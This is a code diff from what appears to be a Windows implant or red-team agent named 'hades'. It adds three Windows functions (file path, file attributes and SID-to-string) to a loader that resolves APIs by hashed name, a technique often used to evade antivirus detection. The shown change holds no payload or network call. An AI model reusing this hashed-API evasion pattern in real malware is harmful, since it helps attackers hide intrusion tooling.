@@ -84,6 +84,8 @@ BOOL LoadAPIS() {
 
 	hades->Modules.K32 = GetModule(HASHED_Kernel322);
 	if (hades->Modules.K32) {
+		hades->WinApis.GetFullPathNameA     = (decltype(hades->WinApis.GetFullPathNameA))GetProc(hades->Modules.K32, HASHED_GetFullPathNameA);
+		hades->WinApis.GetFileAttributesA   = (decltype(hades->WinApis.GetFileAttributesA))GetProc(hades->Modules.K32, HASHED_GetFileAttributesA);
 		hades->WinApis.LoadLibraryA         = (decltype(hades->WinApis.LoadLibraryA))         GetProc(hades->Modules.K32, HASHED_LoadLibraryA);
 		hades->WinApis.GetProcAddress       = (decltype(hades->WinApis.GetProcAddress))		  GetProc(hades->Modules.K32, HASHED_GetProcAddress);
 		hades->WinApis.HeapReAlloc          = (decltype(hades->WinApis.HeapReAlloc))		  GetProc(hades->Modules.K32, HASHED_HeapReAlloc);
@@ -141,7 +143,7 @@ BOOL LoadAPIS() {
 		hades->WinApis.LookupPrivilegeNameA = (decltype(hades->WinApis.LookupPrivilegeNameA)) GetProc(hades->Modules.ADVAPI32, HASHED_LookupPrivilegeNameA);
 		hades->WinApis.GetUserNameA         = (decltype(hades->WinApis.GetUserNameA))         GetProc(hades->Modules.ADVAPI32, HASHED_GetUserNameA);
 		hades->WinApis.GetTokenInformation  = (decltype(hades->WinApis.GetTokenInformation))  GetProc(hades->Modules.ADVAPI32, HASHED_GetTokenInformation);
-
+		hades->WinApis.ConvertSidToStringSidA = (decltype(hades->WinApis.ConvertSidToStringSidA))GetProc(hades->Modules.ADVAPI32, HASHED_ConvertSidToStringSidA);
 	}
 
 
